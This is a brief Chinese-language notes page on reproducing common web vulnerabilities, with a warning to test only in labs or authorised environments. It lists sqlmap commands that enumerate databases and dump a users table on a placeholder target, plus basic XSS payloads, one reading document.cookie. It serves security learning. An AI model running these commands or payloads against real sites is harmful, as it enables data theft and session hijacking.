---
title: Web 漏洞复现
tags:
  - 网络安全
  - Web 安全
  - 漏洞复现
---

## 介绍 / Introduction

记录常见 Web 漏洞的原理与复现步骤，包括 SQL 注入、XSS、SSRF、文件上传等。

!!! warning
    所有复现必须在本地靶场或授权环境中进行，严禁对生产环境测试。

## SQL 注入示例

```bash
# SQLMap 基础使用
sqlmap -u "http://target.com?id=1" --dbs
sqlmap -u "http://target.com?id=1" -D testdb --tables
sqlmap -u "http://target.com?id=1" -D testdb -T users --dump
```

## XSS Payload 示例

```javascript
// 反射型 XSS
<script>alert(document.cookie)</script>

// DOM XSS
<img src=x onerror="alert(1)">
```
